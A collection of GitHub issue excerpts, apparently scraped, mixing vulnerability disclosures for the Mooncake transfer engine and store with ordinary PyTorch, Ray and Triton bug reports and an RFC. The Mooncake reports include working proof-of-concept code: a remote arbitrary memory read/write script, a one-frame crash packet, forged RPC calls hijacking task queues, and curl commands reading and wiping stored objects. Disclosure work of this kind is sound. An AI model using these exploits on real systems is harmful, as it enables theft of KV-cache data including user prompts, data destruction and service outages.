Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1`. Run both scripts on machines that can reach each other; use the victim host's real IP, not 127.0.0.1.

Victim (registers a canary buffer, also allocates a second buffer it never registers):

```python
# victim.py
import ctypes, time
from mooncake.engine import TransferEngine

HOST = "192.168.105.123"  # victim host IP

reg = ctypes.create_string_buffer(65536)
nonreg = ctypes.create_string_buffer(65536)
ctypes.memmove(reg, b"C4CANARY" + b"A" * 56, 64)
ctypes.memmove(nonreg, b"C4NONREG" + b"B" * 56, 64)

te = TransferEngine()
assert te.initialize(HOST, "P2PHANDSHAKE", "tcp", "") == 0
assert te.register_memory(ctypes.addressof(reg), 65536) == 0
print("reg_addr =", ctypes.addressof(reg), flush=True)
print("nonreg_addr =", ctypes.addressof(nonreg), flush=True)
print("rpc_port =", te.get_rpc_port(), flush=True)
time.sleep(3600)
```

Run it with `GLOG_logtostderr=1 MC_FORCE_TCP=1 python victim.py 2> victim.log`, then read the data port from the log line `TcpTransport: listen on port <N>`.

Attacker:

```python
# attacker.py
import socket, struct, time

HOST, DATA_PORT = "192.168.105.123", 16662
REG_ADDR = 0x5A89CC2E05A0        # reg_addr printed by victim
NONREG_ADDR = 0x5A89CC3E05A0     # nonreg_addr printed by victim

def hdr(size, addr, opcode):
    return struct.pack("<QQB", size, addr, opcode) + b"\x00" * 7  # 24 bytes, struct not packed

def read_mem(addr, size):
    s = socket.create_connection((HOST, DATA_PORT))
    s.sendall(hdr(size, addr, 0))
    out = b""
    while len(out) < size:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
    s.close()
    return out

def write_mem(addr, data):
    s = socket.create_connection((HOST, DATA_PORT))
    s.sendall(hdr(len(data), addr, 1))
    s.sendall(data)
    time.sleep(1)
    s.close()

print(read_mem(REG_ADDR, 64))      # b'C4CANARY' + b'A'*56   -> arbitrary read, registered buffer
print(read_mem(NONREG_ADDR, 64))   # b'C4NONREG' + b'B'*56   -> read outside any registered buffer
write_mem(REG_ADDR, b"ATTACKER_BYTES" + b"C" * 51)
print(read_mem(REG_ADDR, 64))      # b'ATTACKER_BYTES'...    -> arbitrary write
write_mem(NONREG_ADDR, b"ATTACKER_BYTES" + b"D" * 51)        # write outside any registered buffer
```

Observed on 0.3.11.post1: both reads return the canaries byte for byte (RTT ~0.2 ms), both writes replace the buffer contents, and the victim process stays alive throughout. A control connection that connects and closes, and 100 bytes of garbage sent to the handshake RPC port, also leave the victim alive. A read or write against an unmapped address such as 0x10 does not kill the process: the kernel returns EFAULT to the socket call and the session aborts, so the demonstrated primitive is read/write of mapped memory, not a one-packet crash.

### Impact

This is a missing-authorization issue (CWE-306) on the engine data plane. The attacker needs no credentials, only network reachability to the TCP data port of an engine process. Deployments running the TCP transport (hosts without an RDMA NIC, or `MC_FORCE_TCP=1`) bind it on all interfaces by default; the port is trivially discoverable because it always falls in the documented 15000-17000 range.

Confidentiality: full process memory disclosure. In an sglang or vLLM deployment the hosting process is the scheduler/EngineCore, so the KV cache including user prompts and context, Python heap objects, keys and pointer chains can be dumped. Integrity: an attacker-controlled write anywhere in the process, including memory outside registered buffers, gives data corruption up to code execution in the engine process. Availability: overwriting mapped memory corrupts the hosting engine process. Suggested CVSS:3.1 vector AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8). Affected: mooncake-transfer-engine <= 0.3.12.post1; patched in 0.3.13.

### Before submitting...

- [x] Ensure you searched for relevant issues and read the [documentation]

items.title: [Bug]: Zero-length handshake message causes out-of-bounds read and SIGSEGV in Mooncake transfer engine
items.author: Sunxj059
items.body_excerpt:
### Bug Report

### Summary

`readString` in the P2P handshake path of mooncake-transfer-engine reads a 64-bit length from the network, rejects only lengths above the maximum, allocates a `std::vector<char>` of that size, and then accesses `buffer[0]` unconditionally. A handshake frame with `length = 0` (eight zero bytes) reads out of bounds and crashes the process hosting the engine with SIGSEGV. Runtime-confirmed on the 0.3.11.post1 release wheel, including an sglang PD deployment where the decode scheduler was killed while the router health check kept returning 200. Upstream fixed this in 0.3.12 (commit `c142b40590259360196d8e504b2193382529e7b4`, PR #2343) as a self-initiated hardening without a security advisory, so wheels up to 0.3.11.post1 remain publicly affected and undisclosed. Suggested severity: Medium, CVSS 6.5.

### Details

The handshake listener is `SocketHandShakePlugin::startDaemon` (src/transfer_metadata_plugin.cpp). It binds on all interfaces, picks its port from the documented default range 15000-17000, logs it as `Transfer Engine RPC using P2P handshake, listening on <ip>:<port>`, and calls `readString` on every accepted connection, unauthenticated.

`readString` (include/common.h) in versions up to 0.3.11.post1:

```cpp
uint64_t length = 0;
readFully(fd, &length, sizeof(length));
if (length > kMaxLength) return {type, ""};   // only an upper bound
std::vector<char> buffer(length);             // length == 0 -> empty vector
readFully(fd, buffer.data(), length);         // zero-byte read succeeds
if (buffer[0] <= static_cast<char>(HandShakeRequestType::Probe)) {  // OOB on empty vector
```

The zero-length case passes the only guard, and `buffer[0]` on an empty vector is an out-of-bounds read that manifests as SIGSEGV in the release build. All four frame types (Connection/Metadata/Notify/Probe) reach this code, so any accepted TCP connection can trigger it.

The fix adds an explicit `if (length == 0)` early return before the buffer is allocated. It first shipped in 0.3.12 via PR #2343 ("Guard readString against zero-length network input to prevent OOB access on empty buffer"). No CVE or advisory exists for this issue.

### PoC

Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1`, `MC_FORCE_TCP=1`.

Victim:

```python
# victim.py
import time
from mooncake.engine import TransferEngine

HOST = "192.168.55.134"  # victim host IP
te = TransferEngine()
assert te.initialize(HOST, "P2PHANDSHAKE", "tcp", "") == 0
print("rpc_port =", te.get_rpc_port(), flush=True)
time.sleep(3600)
```

Attacker (a single 8-byte frame):

```python
import socket, struct

s = socket.create_connection((HOST, RPC_PORT))  # rpc_port printed by victim
s.sendall(struct.pack("<Q", 0))                 # length = 0, little-endian
s.close()
```

Observed: the victim exits with code 139 (SIGSEGV). Controls that leave the victim alive: connect and close without sending; a nonzero length followed by garbage JSON; a nonzero length followed by valid JSON.

Sglang impact, observed in a 1-prefill/1-decode deployment with the mooncake transfer backend: sending the same frame to the decode scheduler's handshake port (the `sglang::scheduler` listener visible via `ss -ltnp`, port logged by the engine) terminated the scheduler process. The router health endpoint kept returning 200 and subsequent completion requests timed out until the worker was restarted.

Expected secure behavior: the frame is rejected (as 0.3.12+ does with the zero-length guard) and the process continues serving.

### Impact

This is an out-of-bounds read used as an unauthenticated remote crash (CWE-125). The attacker needs no credentials, only network reachability to the handshake RPC port, which binds on all interfaces and is picked from the documented 15000-17000 range.

One eight-byte frame kills the process hosting the engine. In sglang and vLLM deployments that process is the scheduler or EngineCore, so a single frame removes a prefill or decode worker; the parent HTTP service and router health checks stay green, so orchestrators do not detect the failure and requests routed to the dead worker time out. Recovery requires restarting the worker. Availability-only impact; no confidentiality or integrity effect was observed. Suggested CVSS:3.1 vector AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (6.5). Affected: mooncake-transfer-engine <= 0.3.11.post1; patched in 0.3.12.

items.title: [Bug]: Unauthenticated task assignment, queue theft, and fake completion in Mooncake Store Master
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The replication/migration task system of Mooncake Store Master is exposed on the unauthenticated RPC port (default 0.0.0.0:50051) without caller validation. `CreateCopyTask`/`CreateMoveTask` accept any object key and attacker-chosen target segments and assign the resulting work to the owner of the source segment; `FetchTasks` hands out task queues based on a self-declared client_id; `MarkTaskToComplete` closes a task when the caller claims that same client_id. Together this gives an unauthenticated peer three primitives: force real transfer work onto a victim, steal a victim's task queue, and mark tasks successful without any work. Runtime-confirmed on the master binary shipped in the 0.3.13.post1 wheel (latest release); no fix available. Suggested severity: High, CVSS 8.2.

### Details

`MasterService::CreateCopyTask(key, targets)` (mooncake-store/src/master_service.cpp) validates only that each target segment exists and is allocatable. It never checks who owns `key`: it looks up the victim object's metadata, picks a source replica, resolves the source segment's owner via `GetClientIdBySegmentName`, and submits the task assigned to that owner's client_id. `CreateMoveTask` behaves the same. So any caller decides which object is replicated or moved and into which segments, and the work lands in the victim's queue.

The task store (mooncake-store/src/task_manager.cpp) keys everything on a caller-supplied UUID: `pop_tasks(client_id, batch)` returns the pending queue of whatever client_id the request names, and `complete_task(client_id, task_id, ...)` succeeds whenever `task.assigned_client == client_id` from the request. No authentication binds the claimed identity to the connection. `QueryTask(task_id)` returns the full task record including `assigned_client`, so the needed victim client_id comes from the same unauthenticated API.

Runtime-verified on 0.3.13.post1 (frames forged over coro_rpc, same transport as the Remove issue): a task created with `CreateCopyTask(victim_key, [attacker_segment])` was assigned to the victim's client_id — the returned task payload names the victim's segment as source and the attacker's segment as target; `FetchTasks` claiming the victim's client_id handed the task to the attacker; `MarkTaskToComplete` then flipped it to SUCCESS two milliseconds after creation, before any copy RPC could occur (the task had also left the victim's pending queue via the theft, so the victim's worker could no longer pick it up).

### PoC

Environment as for the Remove report: the 0.3.13.post1 wheel's `mooncake_master` on 0.0.0.0:50051, a victim store client with segment `seg_victim` holding object `victim_task_key`, and an attacker store client with its own segment `seg_attacker`. The attacker forges coro_rpc frames (20-byte header, magic=21; struct_pack bodies captured once by proxying a legit client, then replayed with patched fields; observed function_ids: CreateCopyTask=2013387680, QueryTask=125921908, FetchTasks=3742636100, MarkTaskToComplete=2802188309):

```python
task_id = call(CreateCopyTask, key="victim_task_key", tenant="default",
               targets=["seg_attacker"])          # succeeds, returns task UUID
task = call(QueryTask, task_id=task_id)            # assigned_client == victim's UUID
tasks = call(FetchTasks, client_id=<victim_uuid>, batch=16)   # queue stolen
call(MarkTaskToComplete, client_id=<victim_uuid>, task_id=task_id,
     status=SUCCESS, message="")                   # no data ever moved
task2 = call(QueryTask, task_id=task_id)           # status == SUCCESS
```

Observed: each step returns success; the final QueryTask reports SUCCESS although the task was created two milliseconds earlier and no copy RPC ever ran. The task payload returned by FetchTasks is `{"tenant_id":"default","key":"victim_task_0001","source":"<victim segment>","targets":["<attacker segment>"],...}`, confirming both the forced assignment and the attacker-directed target. Expected secure behavior: task creation requires ownership of the key, and fetching/completing requires an authenticated identity matching the assignee.

### Impact

Any network peer that can reach the master RPC port, without credentials: (1) submits copy/move tasks for arbitrary victims' objects — the victim's client picks them up and performs real data transfers, so an attacker drives other tenants' CPU and network at zero cost, with attacker-chosen targets including the attacker's own segments; (2) claims a victim's queue with the self-declared client_id, stalling the victim's migration and offload; (3) marks tasks successful without work, so replication the system believes happened never did — silent failure of the data-protection goal. Availability and integrity of the replication subsystem are affected; no confidentiality effect was demonstrated in this report. Suggested CVSS:3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H (8.2), CWE-862. Affected: mooncake-store master <= 0.3.13.post1 (latest release), no patched version yet.

items.title: [Bug]: Mooncake Store REST service ships unauthenticated object CRUD and segment management
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The Mooncake Store REST service (`mooncake_store_service.py` in the mooncake wheel, started via `python -m mooncake.mooncake_store_service` or the `mc_store_rest_server` console script, default port 8080) exposes the full object lifecycle of its hosting client without any authentication: reading, writing and deleting arbitrary keys, wiping all keys, mounting and unmounting memory segments, and runtime reconfiguration. Any host that can reach the port operates with the victim client's identity. Runtime-confirmed with the component shipped in the 0.3.13.post1 wheel (latest release); no fix available. Suggested severity: Critical, CVSS 9.8.

### Details

The service is the documented REST gateway for data operations and segment mount workflows (docs http-api-reference/http-service.md). Route registration in `mooncake/mooncake_store_service.py` wires every endpoint directly to the underlying `MooncakeDistributedStore` client with no authentication or authorization anywhere in the file:

- `PUT /api/put` — store any key/value under the victim's identity
- `GET /api/get/{key}` — return the raw bytes of any object the client can see
- `GET /api/exist/{key}` — key oracle
- `DELETE /api/remove/{key}` — remove an object (takes effect once its lease expires; the service does not pass the force flag, so deletes during an active lease fail — a timing difference, not a protection, with the default 20s lease TTL)
- `DELETE /api/remove_all` — wipe all keys
- `POST /api/mount`, `POST /api/mount_shm`, `POST /api/unmount`, `POST /api/unmount_shm` — mount attacker-described memory (name/size/offset/protocol) as the victim's segments
- `POST /api/reconfigure` — runtime reconfiguration of the service

The service binds all interfaces by default. The master-side endpoints it drives are the same unauthenticated RPC surface, but the REST layer is a separate, independent exposure: it hands out the victim client's read and write capability wholesale without any of the master's sanity semantics.

### PoC

Environment: Linux, Python 3.11, `pip install mooncake-transfer-engine==0.3.13.post1`, a running master (the wheel's `mooncake_master` binary) and a victim that has stored objects. Start the service:

```bash
python -m mooncake.mooncake_store_service --config <cfg> --port 18080
```

From any peer that can reach the host:

```bash
# read the victim's cached object bytes (KV cache contents)
curl http://192.168.105.123:18080/api/get/victim_key_00005
# write under the victim's identity (value is stored as the raw string bytes)
curl -X PUT http://192.168.105.123:18080/api/put \
  -H 'Content-Type: application/json' \
  -d '{"key":"atk_inject","value":"ATTACKER_REST_PUT"}'
# delete an object (succeeds once the ~20s lease TTL expires)
curl -X DELETE http://192.168.105.123:18080/api/remove/victim_key_00005
# wipe everything
curl -X DELETE http://192.168.105.123:18080/api/remove_all
# mount attacker-described shared memory as a segment
curl -X POST http://192.168.105.123:18080/api/mount_shm \
  -H 'Content-Type: application/json' \
  -d '{"name":"/attacker_shm","size":1048576,"protocol":"tcp"}'
# runtime reconfiguration (observed switching the service between prefill and decode modes)
curl -X POST http://192.168.105.123:18080/api/reconfigure -H 'Content-Type: application/json' -d '{"mode":"prefill"}'
```

Observed on 0.3.13.post1: all of the above return success — the GET returns the victim's stored canary bytes; the stored PUT value was immediately readable by the victim's own client (integrity violation from the victim's perspective); the DELETE removed the victim object after lease expiry; `remove_all` reported `removed 1 keys` with the remaining injected key gone from existence checks; `mount_shm` created a 1 MiB shared memory object and registered a new segment; and `reconfigure` switched the service between prefill and decode modes, re-mounting a different segment each time. No credential is ever requested on any endpoint.

### Impact

Any network peer that can reach the REST port reads the victim's cached objects (in LLM serving, KV cache containing user prompts and context), injects or deletes data under the victim's identity, wipes the namespace, and mounts attacker-described segments. Confidentiality, integrity and availability are all directly affected; the attacker needs no credentials and only port reachability. The component is documented and ships in the official wheel, listening on all interfaces by default. Suggested CVSS:3.1 vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8), CWE-306. Affected: mooncake wheel <= 0.3.13.post1 (latest release), no patched version yet.

items.title: [Feature request] `torch.export` .save/.load could support `safetensors` and/or `weights_only=True`
items.author: stu-twelvelabs
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Today, torch.export will load tensors via
```
def deserialize_torch_artifact(serialized: Union[Dict[str, Any], Tuple[Any, ...], bytes]):
    if isinstance(serialized, (dict, tuple)):
        return serialized
    if len(serialized) == 0:
        return {}
    buffer = io.BytesIO(serialized)
    buffer.seek(0)
    # weights_only=False as we want to load custom objects here (e.g. ScriptObject)
    artifact = torch.load(buffer, weights_only=False)
    assert isinstance(artifact, (tuple, dict))
    return artifact
```
Security teams really don't like this I have learned 🙂. In the interest of leveraging the awesome benefits of export more safely, it would be amazing to add optional support for any or all of `safetensors` and/or `weights_only=True`!

Thank you for all the work on `torch.export`, it has a very promising future!

### Alternatives

_No response_

items.title: CPU torch.special.logit in float16 and bfloat16 rounds 1 - x and x / (1 - x) to the input dtype before the log, 512 ulp at x = 0.499756, while the CUDA kernel computes in float
items.author: Nicholas022400701
items.body_excerpt:
### 🐛 Describe the bug

`torch.special.logit` on CPU computes `1 - x` and `x / (1 - x)` in the input dtype and only the `log` in float. For float16 and bfloat16 that rounds both intermediates to 11 or 8 significant bits before the log, and near `x = 0.5`, where `logit` is small, the result loses most of its digits: `logit(0.499756)` in float16 is `-0.000488` for an exact `-0.000977`. The CUDA kernel computes the whole expression in `acc_type<scalar_t, true>`, that is in float.

Every float16 and bfloat16 value in (0, 1), against float64 (the inputs are exact in float64):

```python
import torch

for dtype in (torch.float16, torch.bfloat16):
    x = torch.arange(-(2**15), 2**15, dtype=torch.int16).view(dtype)
    x = x[(x > 0) & (x < 1) & (x != 0.5)]  # every value of the dtype in (0, 1), logit(0.5) = 0 exactly
    exact = torch.special.logit(x.double())  # the input is exact in float64
    spacing = torch.finfo(dtype).eps * 2 ** torch.floor(torch.log2(exact.abs()))
    for name, got in (
        ("torch.special.logit(x)", torch.special.logit(x)),
        ("logit(x.float()).to(dtype)", torch.special.logit(x.float()).to(dtype)),
    ):
        ulp = (got.double() - exact).abs() / spacing
        i = ulp.argmax()
        print(
            f"{dtype} {name}: {x.numel()} inputs, max {ulp.max():.3g} ulp,"
            f" {(ulp > 1).sum()} beyond 1 ulp, {(ulp > 10).sum()} beyond 10 ulp;"
            f" worst x = {x[i].item():.6g}: got {got[i].item():.6g}, exact {exact[i].item():.6g}"
        )
    # the per operation rounding of the CPU kernel, reproduced in Python
    one = torch.tensor(1, dtype=dtype)
    emulated = torch.log((x / (one - x)).float()).to(dtype)
    print(f"{dtype} log((x / (1 - x)).float()) with 1 - x and x / (1 - x) rounded to {dtype}:"
          f" {(emulated.view(torch.int16) == torch.special.logit(x).view(torch.int16)).sum()} of {x.numel()} bits equal")
```

```text
torch.float16 torch.special.logit(x): 15358 inputs, max 512 ulp, 582 beyond 1 ulp, 54 beyond 10 ulp; worst x = 0.499756: got -0.000488281, exact -0.000976563
torch.float16 logit(x.float()).to(dtype): 15358 inputs, max 0.5 ulp, 0 beyond 1 ulp, 0 beyond 10 ulp; worst x = 0.000551701: got -7.5, exact -7.50195
torch.float16 log((x / (1 - x)).float()) with 1 - x and x / (1 - x) rounded to torch.float16: 15358 of 15358 bits equal
torch.bfloat16 torch.special.logit(x): 16254 inputs, max 64 ulp, 59 beyond 1 ulp, 5 beyond 10 ulp; worst x = 0.498047: got -0.00390625, exact -0.00781254
torch.bfloat16 logit(x.float()).to(dtype): 16254 inputs, max 0.5 ulp, 0 beyond 1 ulp, 0 beyond 10 ulp; worst x = 1.70618e-06: got -13.25, exact -13.2813
torch.bfloat16 log((x / (1 - x)).float()) with 1 - x and x / (1 - x) rounded to torch.bfloat16: 16254 of 16254 bits equal
```

`torch.special.logit(x.float()).to(dtype)` is correctly rounded at every input, so the error is entirely the intermediate rounding, and the last line of each block reproduces the CPU result bit for bit from `log((x / (1 - x)).float())` with the two intermediates rounded to the dtype. A strided input (the `cpu_kernel_vec` path) gives the same bits as a contiguous one (the `LogitMKLKernel` path), and `eps >= 0` has the same error inside the clamp.

Where it happens: `logit_kernel` in `aten/src/ATen/native/cpu/UnaryOpsKernel.cpp` dispatches with `AT_DISPATCH_FLOATING_TYPES_AND2(kBFloat16, kHalf, ...)` and does `scalar_t` arithmetic on all three paths. `LogitMKLKernel<T>` writes `X_data[i] / (T(1) - X_data[i])` into the output buffer in `T` before `VmlLog<T>` takes the log (in float, through `vec::map`, for the reduced types), and the two `cpu_kernel_vec` lambdas compute `x / (scalar_t(1) - x)` in `scalar_t`, where every `c10::Half` and `c10::BFloat16` operation rounds. `logit_kernel_cuda` in `aten/src/ATen/native/cuda/UnarySpecialOpsKernel.cu` casts to `T_ACC` first and rounds once.

The `OpInfo` reference test does not see it: `logit` carries `precisionOverride({torch.bfloat16: 5e-1, torch.float16: 5e-1})`, an absolute tolerance of 0.5 on a function whose values near 0.5 are below 0.01. Found with `ulpwise survey --functions logit --backends torch --dtypes f16,bf16` (72 ulp at `x = 0.49731` on its 575 point float16 grid, 29 of the 575 inputs beyond the default float16 tolerance of `torch.testing`; 64 ulp in bfloat16).

#198230 touches the same kernel for a different reason (the float and double `log` depends on the layout on MKL builds) and leaves the reduced types as they are.

### Versions

```text
PyTorch version: 2.14.0+cpu
Is debug build: False
CUDA used to build PyTorch: None
OS: Amazon Linux 2023 (x86_64)
GCC version: (GCC) 11.5.0
Python version: 3.13.14 (64-bit runtime)
Is CUDA available: False
CPU: Intel(R) Xeon(R) Processor @ 2.90GHz, AVX512, MKL available
```

### Patch

Compute in float and round once for the reduced types, the way `sigmoid_kernel` in the same file does, and leave float and double as they are. `eps` and `1 - eps` are then taken in float too, as on CUDA: with `eps = 1e-3` the upper clamp of float16 moves from 0.99902 (`1 - eps` rounded to float16) to 0.999, so the two float16 inputs at and above 0.99902 return 6.906 instead of 6.930 (6 ulp); bfloat16 is unchanged there because `1 - eps` rounds to 1 in bfloat16 and the previous kernel never clamped from above.

The test compares every float16 and bfloat16 value in (0, 1), contiguous and strided, with `eps = -1` and `eps = 1e-3`, against the float kernel rounded to the dtype at the default tolerance of the dtype. On 2.14.0+cpu it fails all four ways (386 and 388 of 15359 float16 inputs, 23 of 16255 bfloat16 inputs, greatest relative difference 0.5) and the 276 other `logit` tests of the file pass. I could not build PyTorch here: the patched arithmetic emulated in numpy float32 (`log(x / (1 - x))` on the float32 inputs, clamp in float32) rounds to the same bits as the test's reference at every input, for both dtypes and both `eps` values, so the new test passes on that emulation. Not measured f

items.title: [Core] Ray Client: specific-server child killed in gRPC atfork handler -- "Starting Ray client server failed", empty .err, 40s to surface
items.author: albertlab0
items.body_excerpt:
## What happened + What you expected to happen

### What happened

About 37% of `ray.init("ray://head:10001")` calls against a long-running head node fail with:

```
RuntimeError: Starting Ray client server failed. See ray_client_server_23113.err for detailed logs.
```

raised from `proxier.py:772`. The named `.err` file is **always 0 bytes**.

Over one head-node session I measured 145 spawn attempts and 54 failures (37%). The rate is stable over 26 days and does not trend with uptime -- the first failure occurred 21 minutes after the session started, so this is not a leak.

**Root cause: the specific-server child process is killed by gRPC between `fork()` and `exec()`, inside gRPC's `pthread_atfork` child handler.**

Two disjoint crash signatures account for 42 of the 54 failures:

1. **SIGABRT, 18 occurrences** -- gRPC's own fatal assertion, written to the _parent_ proxier's stderr:
    
    ```
    F1002 00:49:20.021022 3656254 ev_epoll1_linux.cc:1121] Check failed: next_worker->state == KICKED
    *** Check failure stack trace: ***
    ```
    
2. **SIGSEGV, 24 occurrences** -- caught by the kernel. Every one is in a thread named `event_engine` inside `cygrpc.cpython-312-x86_64-linux-gnu.so`:
    
    ```
    event_engine[3658581]: segfault at 0 ip ... in cygrpc.cpython-312-x86_64-linux-gnu.so
    event_engine[3656730]: segfault at 3531313332 ip ... in cygrpc.cpython-312-x86_64-linux-gnu.so
    ```
    
    The faulting pids sit 5-8 above the child pid the proxier logged for the same spawn, consistent with a thread created inside the forked child. Several faulting addresses decode to ASCII digit strings resembling client-server port numbers (`0x3531313332` -> `"23115"`), i.e. a dereference of non-pointer bytes rather than a null -- stale inherited poller state.

**Every fork in this process is unsafe.** All 145 spawns logged:

```
fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
```

The proxier is itself a gRPC server with ~93 threads, and it forks children with `subprocess.Popen`, so gRPC can never quiesce its poller before the fork. The crash is a race _within_ that permanently unsafe condition, which is why it is intermittent and why it does not reproduce reliably in short sessions.

`preexec_fn` is passed unconditionally to `Popen` in `_start_ray_process` (`ray/_private/services.py`), which forces CPython onto the `fork()` + `exec()` path instead of `posix_spawn`/`vfork`. That is what causes the atfork handlers to run at all.

### What I expected

`ray.init()` over Ray Client to connect reliably, and when it cannot, to fail with a diagnosable error promptly.

---

## Two secondary issues, separable from the crash

These are arguably more valuable to fix than the race itself, because they are what made this take a month to diagnose.

### 1. The error message names a file that cannot contain the error

`start_specific_server` opens `ray_client_server_<port>.{out,err}` _before_ the fork, and CPython's `subprocess` `dup2`s them onto the child's fds _after_ the fork, in the child. gRPC's atfork child handler runs before that `dup2`. So when the child dies in the handler, its output goes to the **parent proxier's** `ray_client_server.err`, and the file the error message names is **empty by construction**.

Measured, same session:

- 163 `.err` files, 107 non-empty. A healthy spawn writes 735-1124 bytes, first line ~420ms after fork.
- Failing children die at ~4ms, long before Ray configures logging, so the 0 bytes is not a lost buffer -- the process never got there.

Suggested fix: when the child has already exited, point the user at the proxier's own log, or state that an empty `.err` indicates a pre-`exec` crash. As written the message sends every investigator to an empty file.

### 2. A failure detected in 92ms takes 40 seconds to reach the client

The wait loop in `start_specific_server` is unbounded and polls at 0.5s; it exits as soon as `proc.process.poll() is not None`, so the dead child is detected in **~92ms**. The remaining time is spent in the `Logstream` RPC waiting for a channel to a process already known to be dead:

```
CHECK_CHANNEL_TIMEOUT_S (30) + LOGSTREAM_RETRIES (5) * LOGSTREAM_RETRY_INTERVAL_SEC (2) = 40.000s
```

Measured end to end on the head as **40.001s**. Annotated timeline for one failure:

```
00:49:20.017  fork_posix.cc:71 Other threads are currently calling into gRPC, skipping fork() handlers
00:49:20.021  ev_epoll1_linux.cc:1121 Check failed: next_worker->state == KICKED   <- child dead, +4ms
00:49:20.109  proxier.py:394 SpecificServer startup failed                         <- detected, +92ms
00:49:20.109  proxier.py:772 raise RuntimeError("... See ray_client_server_23113.err ...")
00:49:30.696  proxier.py:452 freeing its port 23113                                <- CHECK_PROCESS_INTERVAL_S
00:49:50.110  proxier.py:441 Timeout waiting for channel                           <- CHECK_CHANNEL_TIMEOUT_S 30s
00:49:52.110  Retrying Logstream connection. 2 attempts failed.
00:49:54.111  Retrying Logstream connection. 3 attempts failed.
00:49:56.111  Retrying Logstream connection. 4 attempts failed.
00:49:58.111  Retrying Logstream connection. 5 attempts failed.
00:50:00.111  Logstream returns NOT_FOUND
```

Note the first `get_channel` burns the full 30s while attempts 2-5 return instantly, because the 30s `_check_processes` sweep had already evicted the dead server from `self.servers`. Lowering `CHECK_CHANNEL_TIMEOUT_S` below `CHECK_PROCESS_INTERVAL_S` therefore makes attempts 2-5 block too, so the knob does not scale the total.

Only `CHECK_CHANNEL_TIMEOUT_S` is env-tunable (`RAY_CLIENT_SERVER_CHECK_CHANNEL_TIMEOUT_S`). `LOGSTREAM_RETRIES`, `LOGSTREAM_RETRY_INTERVAL_SEC` and `CHECK_PROCESS_INTERVAL_S` are plain module constants, so the floor without patching Ray is ~10-15s per failed attempt.

Suggested fix: have `Logstream` short-circuit when `start_specific_server` has already recorded the server as failed. The info

items.title: [Question] How to force certain computations to occur in float16?
items.author: vedantroy
items.body_excerpt:
I have the following kernel:
```python3
@triton.jit
def unmasked_blend_kernel(
    img1_ptr, img2_ptr, ratio: float, total_items: int, BLOCK_SIZE: tl.constexpr
):
    block_idx = tl.program_id(0)
    offset = block_idx * BLOCK_SIZE
    item_element_idxs = tl.arange(0, BLOCK_SIZE)
    img1_item_ptrs = img1_ptr + offset + item_element_idxs
    img2_item_ptrs = img2_ptr + offset + item_element_idxs

    if offset + BLOCK_SIZE > total_items:
        mask = item_element_idxs < total_items % BLOCK_SIZE
        img1 = tl.load(img1_item_ptrs, mask=mask, other=0)
        img2 = tl.load(img2_item_ptrs, mask=mask, other=0)
        out = ratio * img1 + (1.0 - ratio) * img2
        tl.store(img1_item_ptrs, out, mask=mask)
    else:
        img1 = tl.load(img1_item_ptrs)
        img2 = tl.load(img2_item_ptrs)
        out = ratio * img1 + (1.0 - ratio) * img2
        tl.store(img1_item_ptrs, out)
```

Given that this kernel is blending 2 uint8  tensors, I figured it would make sense to do the computation ` out = ratio * img1 + (1.0 - ratio) * img2`  since I don't need high precision.

However, I can't figure out how to force the Triton compiler to do the computations in FP16.
I tried doing:

```python3
        img1 = tl.load(img1_item_ptrs, mask=mask, other=0).to(tl.float16)
        img2 = tl.load(img2_item_ptrs, mask=mask, other=0).to(tl.float16)
```
but from looking at the generated PTX, it just seems like the float16s are just converted to float32s before the multiplication 
occurs.

Is there a way I can force the Triton  compiler  to make the multiplications float16? (Or is this impossible for a good reason;  i.e maybe this is not what I actually want)?

items.title: [RFC] Composable Kernel with runtime aggregate fields
items.author: sjw36
items.body_excerpt:
## Summary

Allow a `@triton.aggregate` to be **constructed on the host** and passed to a
kernel as a single `tl.constexpr` argument. The aggregate's *runtime* data
members (e.g. `tl.tensor`, `tl.tensor_descriptor`, or scalars) are automatically
**lifted to runtime kernel parameters**, while its `tl.constexpr` members are
**baked into the compiled kernel**. Changing a runtime member reuses the already
compiled kernel; changing a compile-time member specializes a new one.

This turns an aggregate into a first-class, composable **kernel-configuration
object** — most naturally, a fused **epilogue** — that a launch site can build,
subclass, and hand to a single kernel body.

## Motivation

Today, customizing a kernel's behavior means threading an ever-growing list of
optional pointers and flags through its signature: a `bias_ptr`, a `has_bias`
flag, a `scale`, an `activation` enum, and so on. Each new fusion variant either
bloats the signature or forces a separate copy of the kernel.

We already have `@triton.aggregate` to bundle values into a struct, and
`@triton.jit` methods to attach behavior. What is missing is the ability to
**build that struct on the host from ordinary runtime data** (a `torch.Tensor`,
a `TensorDescriptor`, a Python scalar) and pass it in as one argument, without
manually splitting it into "the constexpr config" and "the runtime pointers."

The canonical use case is a composable epilogue (see
`python/tutorials/12-composable-kernel.py`):

```python
@triton.aggregate
class BiasAdd:
    bias: tl.tensor        # runtime member  -> lifted to a kernel param
    n_cols: tl.constexpr   # compile-time    -> baked in

    @triton.constexpr_function
    def __init__(self, bias, n_cols):
        self.bias = bias
        self.n_cols = tl.constexpr(n_cols)

    @triton.jit
    def apply(self, acc, offs_n):
        bias = tl.load(self.bias + offs_n, mask=offs_n < self.n_cols, other=0.0)
        return acc + bias[None, :]


@triton.aggregate
class BiasAddScale(BiasAdd):   # inherits fields + apply
    scale: tl.tensor

    @triton.constexpr_function
    def __init__(self, bias, n_cols, scale):
        self.bias = bias
        self.n_cols = tl.constexpr(n_cols)
        self.scale = scale

    @triton.jit
    def apply(self, acc, offs_n):
        return BiasAdd.apply(self, acc, offs_n) * self.scale
```

```python
@triton.jit
def matmul_kernel(a_ptr, b_ptr, c_ptr, ..., epilogue: tl.constexpr, ...):
    ...
    if not epilogue is None:
        acc = epilogue.apply(acc, offs_cn)   # concrete type selects the IR
    ...

# Two launch functions, one kernel body (grid omitted for brevity):
launch(a, b, c, BiasAdd(bias, N))              # base epilogue
launch(a, b, c, BiasAddScale(bias, N, scale))  # derived epilogue
```

Benefits:

